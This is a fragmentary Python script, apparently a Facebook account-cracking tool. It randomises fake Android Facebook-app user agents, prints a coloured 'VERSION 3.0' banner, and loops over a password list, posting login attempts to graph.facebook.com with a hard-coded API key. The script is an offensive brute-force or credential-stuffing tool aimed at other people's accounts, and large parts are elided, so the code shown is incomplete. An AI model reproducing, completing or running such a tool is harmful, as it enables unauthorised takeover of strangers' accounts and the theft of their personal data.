...
# M2
def yousuffile():
    END = 'Davik/2.1.0 (Linux; U; Android 9.1.1; Oppo A5 (2020) Build/RKQ1.211119.001) [FBAN/FB4A;FBAV/188.0.0.13.21;FBBV/39670525;FBDM/{density=1.5,width=720,height=1440};FBLC/en_US;FBCR/Airtel;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/Oppo A5 (2020);FBSV/9.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; Oppo A5 (2020) Build/RKQ1.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
def yousuffile1():
...
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 3.0
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    headers={'User-Agent':'Davik/2.1.0 (Linux; U; Android 14; Pixel 7 Pro Build/UP1A.231005.007) [FBAN/FB4A;FBAV/439.0.0.41.102;FBBV/69028451;FBDM/{density=3.5,width=1440,height=3120};FBLC/en_US;FBCR/Teletalk;FBMF/Google;FBBD/Pixel;FBPN/com.facebook.katana;FBDV/Pixel 7 Pro;FBSV/14;FBOP/1;FBCA/arm64-v8a;]',
...
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': 'Davik/2.1.0 (Linux; U; Android 11; Samsung Galaxy A51 Build/RP1A.200720.012) [FBAN/FB4A;FBAV/428.0.0.36.72;FBBV/61283942;FBDM/{density=2.25,width=1080,height=2400};FBLC/en_GB;FBCR/Robi;FBMF/Samsung;FBBD/Galaxy;FBPN/com.facebook.katana;FBDV/Samsung Galaxy A51;FBSV/11;FBOP/1;FBCA/arm64-v8a;]',
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
